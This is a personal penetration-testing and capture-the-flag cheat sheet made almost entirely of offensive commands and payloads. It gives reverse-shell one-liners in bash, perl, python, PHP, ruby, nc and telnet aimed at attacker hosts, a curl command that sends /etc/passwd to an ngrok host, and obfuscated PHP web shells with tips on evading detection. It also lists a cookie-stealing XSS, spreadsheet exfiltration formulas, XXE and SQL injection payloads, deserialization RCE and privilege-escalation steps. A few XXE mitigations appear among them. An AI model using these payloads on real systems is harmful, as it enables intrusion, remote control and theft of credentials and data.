IMPORTANT FACT
=========================================================================
***for CTF u must understand the hint
***curl -F shl=@/etc/passwd blablabla.ngrok.io
***entity_id=1+or+if(mid(@@version,1,1)=5,1,2)=2%23

**during lfi testing try ..%2f..%2fetc
**bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
**searchsploit for finding exploit

*webscreenshot to capture shot of webpages
*file://c:\WEB\HTML
*magick hacshes->https://www.whitehatsec.com/blog/magic-hashes/
*apache sometime directory listing
*hashcat,hash-identifier
*view page source, and visit every directory u found in source code
** check every possible way, dont be lazzy
**if any send message or comment try "><script>window.location="//x.com"+document.cookie> to get cookie
**if there is like id=123 then consider id=1/0 as admin account and continue attack
**scp bob@servername.com:/home/bob/public_html/index.php Downloads/
**cewl -d 0 -w output.txt http://x.com //used togenerate wordlist from webpages
**If found any template engine like flask jinja etc then put {{5*5}},{{config}}
**hydra -l user-P pass.txt ftp://192.168.2.155shad
**https://medium.com/@vesirin/how-i-gained-commit-access-to-homebrew-in-30-minutes-2ae314df03ab ///github access token + jankins
**if found xss inside electron app than you can try localfile or rce
**X-HTTP-Method-Override: PUT

PAYLOADS
========================
1. //..;/"><iframe src=javascript:alert()> //jetty 6.1.6
2. javascript://www.google.com/%0aalert()
3. ..;/
4. //..;/
5. username: \
6. password: ||1#
7. "<script src=//xsshere?"@email.com
8. “1-’or’1'=’1”@email.com
9. asd'or'1'=;1@a.com
10. \"a'-if(lenght(database())=1.sleep(10),0)or'1'='1\"@a.com
11. intext:APIKey ext:js | xml | yml | txt | conf | py -github -stackoverflow intitle:"index of"
12. plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com
13. inurl:/wls-wsat/CoordinatorPortType //weblogic-rce
14. {{constructor.constructor('alert(1)')()}} //xss using tamplate injection
15.
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>

16.
 <style>
.a {
        font-family: </styl/**/e>;
        font-family: </sty/**/le>;
        font-family: </s/*data*/tyle>;
}
.<iframe/onload=alert(document["cookie"])> { }
</style>

17.
=WEBSERVICE("file:///etc/passwd")
=CELL("filename")
=INFO("system")

18. 
='file:///etc/passwd'#$passwd.A1
=WEBSERVICE("file:///etc/passwd")
=CELL("filename")
=INFO("system")
=WEBSERVICE(CONCATENATE("http://<ip>:8080/",('file:///etc/passwd'#$passwd.A1)))
=WEBSERVICE(CONCATENATE("http://<ip>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))
=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<FQDN>"))

=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")

19. payment webhook
/api/stripe/webhook, /api/payments/webhook, /api/stripeWebhook
{
  "payment": {
    "status":"success",
    "provider":"stripe"
  },
  "id":"..."
}

20.\unicode{<img src=1 onerror=alert(1)>} //mathjax xss

21. Addthis postmessage xss

22. XSS
var n = {a: "-alert(2)}//\", b: "-alert(1)}//\"};
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e //polyglot inside attribute(double quoted attribute)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e //single qouted attrubute polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e //unquoted
<a href="
jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e">click me</a>
<math xlink:href="jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e">click me</math>
<!--
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-->
<title>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
</title>
<style>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
</style>

polyglot
------------
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">

xss in markdown
--------------------
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)

xss in xml
---------
<html> 
<head>
</head>
 <body> <something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
  <info> 
<name> 
<value>
<![CDATA[<script>confirm(document.domain)</script>]]>
</value> 
</name> 
<description> 
<value>Hello</value>
 </description> 
<url> 
<value>http://google.com</value> </url> </info> </body></html>

<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>


https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection

23. Searilialize Bug
a:1:{i:0;i:1337;}
test=> a:1:{i:0;O:9:"Exception":0:{}}  //https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/

24. Template injection jinja
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}} 
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}

TOOLS
=================================
forensic'
----------------
autopsy
encrypted disk detector
network miner
FAW




GIT
=====================
git log -p
git checkout hash_value

PORT EXPLOIT
==================================
2049 nfs
---------
showmount -e 192.168.2.12
sudo mount -t nfs 192.168.2.12:/home ./mnt

25 smtp
--------------
use auxiliary/scanner/smtp/smtp_enum //username enumerate
nmap --script smtp-enum-users.nse 192.168.2.12

21 ftp
-----------
bruteforce password using seclists to_username file.

8080
-------
'search tomcat' in msfconsole and try those payload including pass bruteforce

445/139 samba
--------------
enum4linux 192.168.2.12


EXPLOITDB priv escalation
============================
first search "linux kernel " in searchsploit and try them which match
next "linux kernel 2.6.22" and "linux kernel 2.6"
https://www.exploit-db.com/download/36746.c

PSSWORD CRACK
==========================
linux shadow
-------------
unshadow passwd shadow >./final.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ./final.txt


 
VULNHUB
=================================================================================================================================================================
******always search for exploit in google "linux kernel 4.4 priv escalation" and also "linux kernel 3.16.0-30" vulnerability

**www.securitysift.com/download/linuxprivchecker.py
**https://github.com/rebootuser/LinEnum
*************https://www.rebootuser.com/?p=1623
***https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
***https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
***https://www.contextis.com/blog/data-exfiltration-via-blind-os-command-injection
***https://github.com/Shiva108/CTF-notes/blob/master/Notes%20VA/Local%20Linux%20Enumeration%20n%20Privilege%20Escalation%20Cheatsheet%20.txt
***https://gist.github.com/sckalath/8b8fe29ee5489eaefda1 //priv escalation
***https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html
***https://guif.re/linuxeop   //must try
apache2 default file location https://wiki.apache.org/httpd/DistrosDefaultLayout#Debian.2C_Ubuntu_.28Apache_httpd_2.x.29:

priv escalation using nfs
-------------------------
https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/

priv enumeration script
------------------------
also serch in google for exploit like "linux kernel4.4 priv escalation"
http://www.securitysift.com/download/linuxprivchecker.py
https://github.com/rebootuser/LinEnum
http://pentestmonkey.net/tools/audit/unix-privesc-check
https://github.com/mzet-/linux-exploit-suggester.git


***upload privilege-escalation-check and check weak privilege and run 'openssl passwd -1' to generate passwd
***if php ,then upload php reverse shell
***alternative of cat is less,more,grep ['a-zA-Z0-9'] /etc/passwd,printf '%s' "$(<file.txt)"

export PATH=/var/www/backup:${PATH}
hydra 192.168.56.104 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l ignore -P /usr/share/wordlists/rockyou.txt

select "<?php echo system($_GET['cmd']);?>" into outfile "/var/www/html/a.php" //shell upload using phpmyadmin

extra
----------
http://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
https://pentestlab.blog/2017/09/25/suid-executables/

*******must read source code carefully
*******must read nmap scan port carefully and search exploit for that port.
*******must search in google for vulnerability if unknown keyword found

FACTS
-----------
user        ALL=(ALL:ALL) ALL  //give a user sudo permission in /etc/sudoers,when users user run sudo command he need current password.
user    ALL=(ALL) NOPASSWD: ALL //its dont require current password when user user run sudo command.

Cmnd_Alias TEST=/bin/sh,/bin/ls  //allow custom sudo command
user ALL=(ALL) NOPASSWD: TEST //no password required
user ALL=(ALL) TEST //password required

sudo usermod -a -G sudo USERNAME //add a use to sudo group
echo "pahan12\npahan12\n"|passwd user //change password of user in oneline command


FILE TRANSFER
------------------
ftp,wget,curl,nc,scp mysqli@192.168.2.22:/home/a.php ./a.php

**https://gtfobins.github.io/gtfobins/whois/
**sudo -l //check current user permission

**cat /etc/fstab //check unmount filesystem

**smbscanner usiing enum4linux -o -i -a ip and smbclient \\\\zimmerman\\public
**reverse shell -  bash -i >& /dev/tcp/192.168.1.16/1234 0>&1
**find os  release version and check searchsploit 

**/etc/sudoers or /etc/exports
**netstat -tunlp //list listening with pid/program name
   now u can check info about that pid using ls -l /proc/<pid>

upgrade to pty/tty shell
-------------------
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
irb(main:001:0> exec "/bin/sh"
php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.4.4:9876/RSQjat'));"
/bin/sh -i
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; 	find
awk 'BEGIN {system("/bin/bash")}' awk

SHELL command inside editor
--------------------------
in man command !id
in vi enter :set shell sh=id then enter :sh
in vi you can open enother file using :e /etc/passwd
in more execute command using !id
in more enter in vi using type v
in vim type ":set shell=/bin/sh" and then :shell to get a shell
more,less,man command allow !whoami,! whoami
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it. 	
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

/etc/crontab
/etc/mysql/conf.d/credentials.txt

find / -writable -type d 2>/dev/null      # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders
find / -perm -o x -type d 2>/dev/null     # world-executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

find / -user user -exec file {} + 2>/dev/null|grep 'ASCII' //file owned by user
find / -user technawi -type f 2>&1 | grep -v "Permission" | grep -v "No such" //fileowned by user
find / -name ".*" -perm -o+r -print 2>/dev/null | grep -v 'Permision denied' //hidden file find

/proc/self =>return info about who called this file.
sometime appache httpd need configuration file,which need to run using commandline.and in that case we use /proc/seld/cmdline
it contain configuration path ,log path etc

/var/log/auth.log
/var/backups
/proc/self/fd/0..15.. //return the directory information that proccess currently hold.
/proc/self/environ //environment varriable
/proc/self/console – Information about current consoles including tty.
/proc/self/mounts – List of all mounts in use by system.
/proc/self/partitions – Detailed info about partitions available to the system.
/proc/self/0..25.. ---- //information about PID, it contains many file about that PID.

also there ismany directory inside /proc or /proc/self or /proc/<pid> 
    cwd – a link to the current working directory of the process
    exe – link to the executable of the process
    root – link to the work directory of the process

root mysql to root system
-------------------------
ls -la /usr/lib/lib_mysqludf_sys.so //check existance also can download https://raw.githubusercontent.com/mysqludf/lib_mysqludf_sys/master/lib_mysqludf_sys.so
mysql> select sys_exec('usermod -a -G admin john');
or
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
mysql> select sys_exec('chmod u+s /bin/bash');

find file /search
===========================================================
find . -name testfile.txt =>current directory /subdirectory
find /home -type f -name '*.jpg
find / -size 50c
find / -mtime 1 //find file which midfied 1day ago
find / -user syslog
find / -perm 644
find / -group shadow


 SHELL/REVERSE SHELL
===========================================================================================================================
https://github.com/s0md3v/nano
<?$x=$_GET;$x[p]=='_'&&$x[f]($x[c]);
http://example.com/nano.php?f=function&c=command&p=password
<?$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
if $_GET,$_POST block then use $_REQUEST,$_SERVER,$_FILES,$_COOKIE etc if system block then use exec,eval,popen etc;
you can avoid php detection using...
$k = strrev( "edoced_4" . "6esab" );eval($k('base64 payload'))

https://netsec.ws/?p=331



bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 //bash shell
 0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.1",8183));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.2.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

telnet attackerip 4444 | /bin/bash | telnet attackerip 4445

nc -c /bin/sh attackerip 4444 //1
/bin/sh | nc attackerip 4444  //2
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p //3

#1
nc <attacker_ip> <port> -e /bin/bash
#2
mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
#3
/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
#4
mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
#5
telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
#7
wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php


DORK
=================
inurl:jira AND intitle:login AND inurl:[company_name
inurl:https://trello.com AND intext:@gmail.com AND intext:password

OPEN SOURCE SEARCH
=====================
grep -r 'mysql_query' ./*.php | grep '$_'
grep -R "GET"


RECON TIPS
=================
1. subdomain with aquatone
2.shodan search org:"google"//  google.com
3. subdomain with cencys using  443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:edited.de
   also search with domain like google.com
  jenkins
---------
 a)REDACTED-jenkins-$env.sc-corp.net  replace env with pod.stage,test,dev,alpha,beta,local
 try login using google account
 http://nahamsec.com/secure-your-jenkins-instance-or-hackers-will-force-you-to/
4.webarchive using http://web.archive.org/cdx/search/cdx?url=quantopian.com/*&output=text&fl=original&collapse=urlkey
2.s3 bucket

TOOLS
==============================
dnsrebinding
-------------
https://www.kitploit.com/2018/05/whonow-malicious-dns-server-for.html

ngrok-backdoor tunnel
--------------
https://www.kitploit.com/2018/04/grok-backdoor-backdoor-with-ngrok.html


JAVASCRIPT XHR REQUEST
=======================
 <script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script> 


CROSSDOMAIN
=============
https://sethsec.blogspot.in/2014/03/exploiting-misconfigured-crossdomainxml.html
http://gursevkalra.blogspot.in/2013/08/bypassing-same-origin-policy-with-flash.html
https://www.paladion.net/blogs/weak-crossdomain-xml-and-its-exploitation-poc

API
=======================
https://app.mavenlink.com/api/v1/users
https://app.mavenlink.com/api/v1/users/me

AUTH BYPASS
============
https://login.mailchimp.com/oauth2/authorize?response_type=token&client_id=112041070777&redirect_uri=https%3A%2F%2Fapps.facebook.com%2F attacker%2F
https://prakharprasad.com/facebook-mailchimp-application-oauth-2-0-misconfiguration/

FILE UPLOAD
============
.php5,PHP,shtml,eml,php.jpg,asda.php\x00.jpg,sdfs.php%00.jpg,svg,shell.aspx;1.jpg,
upload swf file with jpg extension and call <object>
1.if image upload try 
 a) imagemagick out-of-band
 b) imagemagick pillete extractor
      using https://github.com/neex/gifoeb
            ./gifoeb gen 1123x987 dump.jpg
            ./gifoeb gen 1123x987 dump.png
            ./gifoeb gen 1123x987 dump.bmp
            ./gifoeb gen 1123x987 dump.tiff
            ./gifoeb gen 1123x987 dump.tif
         

          for p in previews/*; do
            ./gifoeb recover $p | strings;
          done
     i)imagemagick curl vulnerability using svg 
       <image xlink:href="https://hethical.io/content/images/2016/06/me.jpg&quot;; eval ls; echo &quot;vulnerable" x="0" y="0" height="640px" width="480px"/>
    https://hethical.io/trello-bug-bounty-access-servers-files-using-imagetragick/

 c) pixel flood
 d) svg upload
 e) if image croping then try https://hackerone.com/reports/212696
2.if video upload
 a)ffmpeg ssrf
 b)if video caption the xss via subtitle
 
3.svg upload and xxe/xss/setting cookie
4.shell uploading by null byte/content type change/gif uploading...
5.directory traversal
6.if docx,doc,xlsx upload
  a) try xxe

APACHE
====================
Apache Struts2 2.0.0 < 2.3.15 - Prefixed Parameters OGNL Injection
-------------------------------------
action:, redirect:, redirectAction:, method:
http://host/struts2-blank/example/X.action?action:%25{3*4}
https://www.exploit-db.com/exploits/44583/?rss&utm_source=dlvr.it&utm_medium=twitter


XXE via spreadsheet(doc,docx,xlsx)
=================================
https://github.com/BuffaloWill/oxml_xxe
**https://buer.haus/xxegen/
**goto https://github.com/BuffaloWill/oxml_xxe and generate many xxe payload file
**
read file Read file xxe.xlsx\xl\worksheets\sheet1.xml and add payload
<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" >]>
also u can add <asd>&xxe;<asd>inside root element or outside root element.

**unzip docx and edit  [Content_Types].xml with bellow payload
<!DOCTYPE go [
<!ENTITY % go2 SYSTEM "http://192.168.1.1:8000/XXE">
%go2;]>
zip -u xxe.docx \[Content_Types\].xml
**
you can add payload in following file...
DOCX=>/word/document.xml
PPTX=>/ppt/presentation.xml
XLSX=>/xl/workbook.xml

XSS
--------------
< !ENTITY post "<script>alert(1)...
< !ENTITY post "< ![CDATA[<script>alert(1)...
LFI
--------------
Relationship Id="rId1" Type="...relationships/officeDocument" Target="/word/document.xml"


BUG
===========
*** you can read local files using object, iframe or embed tags
https://mike-n1.github.io/SSRF_P4toP2

lfi using pdf
----------
http://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html

Atlassian ssrf/xss
--------------------
plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com


DIRECTORY SCANNER
================
1.dirb 2.uniscan 3.nikto 4.gobuster 
all directory wordlist and rockyou.txt locate at /home/user/Desktop/bug_bounty/CTF/wordlist

sqli to xxe
================
Xxxx'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % evil SYSTEM "http://haxor.com/ ">%evil;]>'),'/l') from dual)||'




SERIALIZE
=======================
nodejs
----------
{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}

php
-----------
O:9:"FileClass":1:{s:8:"filename";s:10:"config.php";}

PHP MAGIC FUNCTION
=====================
__construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(), __sleep(), __wakeup(), __toString(), __invoke(), __set_state() and __clone()


COMMAND INJECTION BYPASS
============================
l\s
cat /etc/pass??
w'h'o'am'i , w"h"o"am"i, who$@ami ,$0 = /bin/bash so , echo whoami|$0

COMMAND WITHOUT SPACE
======================
1. ls$IFS-l;
2. {cat,file.txt}
3. IFS=:;a=cat:file.txt;$a


1. list directory of current folder=>  ls -d */
2.list all subdirectory of folder => find . -maxdepth 2 -type d
3. execute system command inside quote => echo "`id`", echo "$(id)", curl http://x.com/`id`
4.shortest php backdoor
----------------------
<?=`ls`; # work <?=@`ls`; # work and I found this " ~ " can also work . <?=~`ls`; # work but unicode (or something). so, <?=~`ls>test.txt`; # work

4a. upload php file with this tag and it execute as php <script language="php"> </script> 

5.echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u <target> 11211 =>memcached server

6.w'h'o'am'i , w"h"o"am"i, who$@ami ,$0 = /bin/bash so , echo whoami|$0

7.padding oracle =>padbuster(bellow) detect using decode base64 and count caracter ,it wouldbe multipleof 8,16

8.PHP offers three frequently used methods of parsing and consuming XML: PHP DOM, SimpleXML and XMLReader. All three of these use the libxml2 extension and external entity support is enabled by default. As a consequence, PHP has a by-default vulnerability to XXE .
DOMDocument::loadXML()====> also vulnerable to xxe

$dom = new DOMDocument;
$dom->loadXML($xmlString);
this code is vulnerableto xxe

mitigation
--------
$oldValue = libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->loadXML($xml);
libxml_disable_entity_loader($oldValue);

/**
 * Attempt a quickie detection
 */
$collapsedXML = preg_replace("/[:space:]/", '', $xml);
if(preg_match("/<!DOCTYPE/i", $collapsedXml)) {
    throw new \InvalidArgumentException(
        'Invalid XML: Detected use of illegal DOCTYPE'
    );
}


$oldValue = libxml_disable_entity_loader(true);
$dom = new DOMDocument;
$dom->loadXML($xml);
libxml_disable_entity_loader($oldValue);
foreach ($dom->childNodes as $child) {
    if ($child->nodeType === XML_DOCUMENT_TYPE_NODE) {
        throw new \InvalidArgumentException(
            'Invalid XML: Detected use of illegal DOCTYPE'
        );
    }
}


9. <?php
$doc = new DOMDocument();
$doc->load('book.xml');
echo $doc->saveXML();
?> it may also vulnerable to directory travarsal

10.
 filter_var($_GET['http_url'], FILTER_VALIDATE_URL);
it allow javascript://foobar%0aalert(), php://, zip:// data://


DEBUGING JAVASCRIPT
==========================================================================================
chrome->source tab->
create breakpoint anywhere,refresh page,and hover over the varriable before breakpoint and see varriable value.
in right side you can see all local and global varriable value

PHP
====================================================================================================================================================================
1.TYPE JUGGLING
----------------
 Try to use functions and operators that do not do implicit type conversions (e.g. === and not ==). Not all operators have strict versions (for example greater than and less than), and many built-in functions (like in_array) use weakly typed comparison functions by default,

2. shell executte(shell_exec,exec,proc_open,passthru,system backtick operator,popen,pcntl_exec)
   execute(eval,preg_replace with /e modifier,include[_once]/require[_once],create_function,assert(),file_get_contents,readfile,glob,mysql_query )
more=> https://stackoverflow.com/questions/3115559/exploitable-php-functions

3.
      $db_link = mysqli_connect('localhost', 'dbuser', 'dbpassword', 'dbname');

   function can_access_feature($current_user) {
       global $db_link;
       $username = mysqli_real_escape_string($db_link, $current_user->username);
       $res = mysqli_query($db_link, "SELECT COUNT(id) FROM blacklisted_users WHERE username = '$username';");
       $row = mysqli_fetch_array($res);
       if ((int)$row[0] > 0) {
           return false;
       } else {
           return true;
       }
   }

for example, the database connection could fail, due to a wrong password or the server being down etc., or the connection could be closed by the server after it was opened client side. In these cases, by default the mysqli_ functions will issue warnings or notices, but will not throw exceptions or fatal errors. This means that the code simply carries on! The variable $row becomes NULL, and PHP will evaluate $row[0] also as NULL, and (int)$row[0] as 0, due to weak typing. Eventually the can_access_feature function returns true, giving access to all users, whether they are on the blacklist or not. 

4.
  $location = $_POST['location'];
  $filename = "./sites/".$user.".php";
		  ...................etc......................
		  $html = "<?php
		  \$regdate = \"$date\";
		  \$user = \"$user\";
		  \$pass = \"$pass1\";
		  \$email = \"$email1\";
		  \$location = \"$location\";
		  \$url = \"$url\";
		  ?>";
		  $fp = fopen($filename, 'a+');
		  fputs($fp, $html) or die("Could not open file!");

pass this $location = "";?><?php system($_GET['cmd']);?><?php $xxx=":D";

5. 
   <?php
		   $code=$_GET['code'];
		   eval($code); 
		   ?>

http://127.0.0.1/test.php?code=system(whoami);
***must use termination statement ;

6.
 <?php
		   if ($logged==true) {
		   echo 'Logged in.'; }
		   else {
		   print 'Not logged in.';
		   }
		   ?>
  http://127.0.0.1/test/php?logged=1 and need to _gloabals = on.

7. XMLRPC
-------------
<?xml version="1.0"?> <methodCall> <methodName>test.method</methodName> 	<params> 		<param> 		<value><name>','')); phpinfo(); exit;/*</name></value> 		</param> 	</params> </methodCall>

8.
  <?php
if (isset($_GET['page'])) {
    $page = $_GET['page'];
} else {
    $page = "home";
}
$file = "includes/" . $page . ".php";
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!"); // vulnerable code!
>?
http://example.com/inex.php/?page=’, ‘qwer’) === false && strlen(file_get_contents(“../../../../../etc/passwd”)) == 0 && strpos(‘1
  
9. $q=sprintf("UPDATE user set points=%d%s",$_GET['p'],$_GET[asd]])
here admin password is flag ,so we need to extract password using sql injection
$_GET['p']=1 and $_GET['asd']=*hex(substr((select password),1,1)); //substr or substring both we can use

10. 
    $validatedId = $_POST['id'];
    $pdo = new PDO('mysql:store.db');
    $stmt = $pdo->prepare('SELECT * FROM transactions WHERE user_id = :id');
    $stmt->bindParam(':id', $validatedId, PDO::PARAM_INT);
    $stmt->execute();
it automatically escape $validateId parameter and placed in place holder

11.
  if($_GET["str1"] and $_GET["str2"]) {
    if ($_GET["str1"] !== $_GET["str2"] and
        hash("md5", $salt . $_GET["str1"]) === hash("md5", $salt . $_GET["str2"])) {
      echo $flag;
    }

 str1[[]=xss&str2=Array

12. if (isset($_GET['name']) and isset($_GET['password'])) 
{
  if ($_GET['name'] == $_GET['password']) 
 print 'Your password can not be your name.';  
else if (sha1($_GET['name']) === sha1($_GET['password']))  die('Flag: '.$flag);  
else  print '<p class="alert">Invalid password.</p>'; }

name[]=das&password[]=dasda

14.
if (isset($_GET['name']) and isset($_GET['password']))
 {  
   $name = (string)$_GET['name']; 
 $password = (string)$_GET['password'];  
 if ($name == $password) {
   print 'Your password can not be your name.';  }
 else if (sha1($name) === sha1($password)) {  
die('Flag: '.$flag);  
}
 else {  print '<p class="alert">Invalid password.</p>';  
} }

create two identical sha1 pdf and pass first 320 bytes as parameter

15.

<?php 
 if (isset($_GET['page'])) {  
$page = $_GET['page']; 
} 
else {  
$page = "home"; 
}  
$file = "templates/" . $page . ".php"; 
 // I heard '..' is dangerous! 
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!"); 
 // TODO: Make this look nice 
assert("file_exists('$file')") or die("That file doesn't exist!");  
?>

=>http://web.chal.csaw.io:8000/?page='.system("cd ../../../; ls -lA;").'about

16.
<?php 
include "config.php"; $con = mysqli_connect($MYSQL_HOST, $MYSQL_USER, $MYSQL_PASS, $MYSQL_DB); 
$username = $_POST["username"]; 
$password = $_POST["password"]; 
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'"; 
$result = mysqli_query($con, $query); 
 if (mysqli_num_rows($result) !== 1) {  
echo "<h1>Login failed.</h1>"; 
} else { 
 echo "<h1>Logged in!</h1>";  
echo "<p>Your flag is: $FLAG</p>"; 
}  
?>

=> Here database has no record ,so to print flag we need  to atleast 1 row, so payload will be............
